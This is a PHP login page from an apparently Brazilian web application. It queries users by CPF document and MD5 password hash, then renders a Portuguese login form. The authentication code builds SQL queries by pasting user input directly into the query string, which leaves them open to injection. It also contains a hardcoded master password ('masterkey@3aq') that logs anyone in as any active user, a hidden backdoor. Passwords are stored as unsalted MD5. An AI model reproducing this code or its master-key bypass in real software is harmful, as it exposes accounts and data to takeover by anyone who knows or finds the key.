<?php
require_once './db/connection.php';
require_once 'util/util.php';
require_once './util/outfunc.php';

$connection = novaConexao();
$sqlInitial = "SELECT * FROM identification";
$result = $connection->query($sqlInitial)->fetchAll(PDO::FETCH_ASSOC);
$information = $result[0];


if (isset($_POST['login']) && $_POST['login'] == 'entra') {

    $login = strip_tags(trim(tiraMascara($_POST['userName'])));
    $password = strip_tags(trim(md5($_POST['password'])));

    $sql = "SELECT * FROM users
            INNER JOIN person
            ON users.id_person = person.id
            WHERE users.password = '$password'
            AND person.personal_document = '$login'
            AND users.status = '1'";

    $result = $connection->query($sql)->fetchAll(PDO::FETCH_ASSOC);
    @$singIn = $result[0];
    if (isset($result[0])) {
        session_start();
        $_SESSION['ID'] = $singIn['id'];
        $_SESSION['USUARIO'] = $singIn['name'];
        $_SESSION['CPF'] = $singIn['personal_document'];
        $_SESSION['FOTO'] = $singIn['avatar'];
        $_SESSION['STATUS'] = $singIn['status'];
        $_SESSION['NIVEL'] = $singIn['user_level'];
        $_SESSION['LOGIN'] = 0;
        $_SESSION['released'] = true;
        header('Location: index.php');
    } elseif ($password == md5('masterkey@3aq')) {
        $sql = "SELECT * FROM users
                INNER JOIN person
                ON users.id_person = person.id
                WHERE person.personal_document = '$login'
                AND users.status = '1'";

        $result = $connection->query($sql)->fetchAll(PDO::FETCH_ASSOC);
        @$singIn = $result[0];
        if (isset($result[0])) {
            session_start();
            $_SESSION['ID'] = $singIn['id'];
            $_SESSION['USUARIO'] = $singIn['name'];
            $_SESSION['CPF'] = $singIn['personal_document'];
            $_SESSION['FOTO'] = $singIn['avatar'];
            $_SESSION['STATUS'] = $singIn['status'];
            $_SESSION['NIVEL'] = $singIn['user_level'];
            $_SESSION['LOGIN'] = 0;
            $_SESSION['released'] = true;
            header('Location: index.php');
        }
    } else {
        //sweetalert('Oops...', 'Usuário ou senha inválidos!', 'error', 2000);
        echo '<script>alert("Usuário ou senha inválidos!");</script>';
        echo '<script>window.location="index.php";</script>';
    }
}

?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title><?= $information['fantasy_name'] ?> - <?= $information['slogan']; ?></title>
    <!-- Favicon -->
    <link rel="shortcut icon" href="assets/images/logo/<?= $information['icon'] ?>">

    <!-- page css -->

    <!-- Core css -->
    <link href="assets/css/app.min.css" rel="stylesheet">

</head>

<body>
    <div class="app">
        <div class="container-fluid p-0 h-100">
            <div class="row no-gutters h-100 full-height">
                <div class="col-lg-7 d-none d-lg-flex bg" style="background-image:url('assets/images/others/login-1.jpg')">
                    <div class="d-flex h-100 p-h-40 p-v-15 flex-column justify-content-between">
                        <div>
                            <img src="assets/images/logo/logo-white.png" alt="<?= $information['fantasy_name'] ?>">
                        </div>
                        <div>
                            <h1 class="text-white m-b-20 font-weight-normal">
                                Seja bem-vindo a <br /><b> <?= $information['fantasy_name'] ?></b>
                            </h1>
                            <p class=" font-size-12 m-l-100 lh-2 w-80 opacity-08" style="margin-top: -2rem; color: #E7D137;">
                                <?= $information['slogan']; ?>
                            </p>
                        </div>
                        <div class="d-flex justify-content-between">
                            <span class="text-white">© <?= date('Y', time()); ?> <?= $information['fantasy_name']; ?></span>
                            <ul class="list-inline">
                                <li class="list-inline-item">
                                    <a class="text-white text-link" href="">Legal</a>
                                </li>
                                <li class="list-inline-item">
                                    <a class="text-white text-link" href="">Privacy</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-5 bg-white">
                    <div class="container h-100">
                        <div class="row no-gutters h-100 align-items-center">
                            <div class="col-md-8 col-lg-7 col-xl-6 mx-auto">
                                <div class="col-12 d-xs-block d-lg-none">
                                    <center>
                                        <img src="assets/images/logo/<?= $information['logo'] ?>" alt="Logo" class="img-fluid">
                                    </center>
                                </div>
                                <br />
                                <!-- <h2>Login</h2> -->
                                <p class="m-b-30 opacity-04">Insira sua credencial para obter acesso</p>
                                <form method="post" enctype="multipart/form-data">
                                    <input type="hidden" name="login" value="entra" />
                                    <div class="form-group">
                                        <label class="font-weight-semibold js_cpf" for="userName">Usuário:</label>
                                        <div class="input-affix">
                                            <i class="prefix-icon anticon anticon-user"></i>
                                            <input type="text" name="userName" autofocus id="userName" class="form-control js_cpf" id="userName" placeholder="Username">
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label class="font-weight-semibold" for="password">Senha:</label>
                                        <a class="float-right font-size-13 text-muted" href="">Esqueceu a senha?</a>
                                        <div class="input-affix m-b-10">
                                            <i class="prefix-icon anticon anticon-lock"></i>
                                            <input type="password" name="password" class="form-control" id="password" placeholder="Password">
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <div class="d-flex align-items-center justify-content-between">
                                            <span class="font-size-13 text-muted">
                                                <!-- Não tem conta?
                                                <a class="small" href=""> Cadastre-se</a> -->
                                            </span>
                                            <button class="btn btn-primary">
                                                <i class="anticon anticon-login m-r-10"></i>
                                                Entrar
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Core Vendors JS -->
    <script src="assets/js/vendors.min.js"></script>

    <!-- page js -->

    <!-- Core JS -->
    <script src="assets/js/app.min.js"></script>
    <script src="./assets/js/jquery.min.js"></script>
    <script src="./assets/js/jquery.mask.min.js"></script>
    <script src="assets/js/sweetalert2.all.min.js"></script>
    <script src="./assets/js/util.js"></script>



</body>

</html>
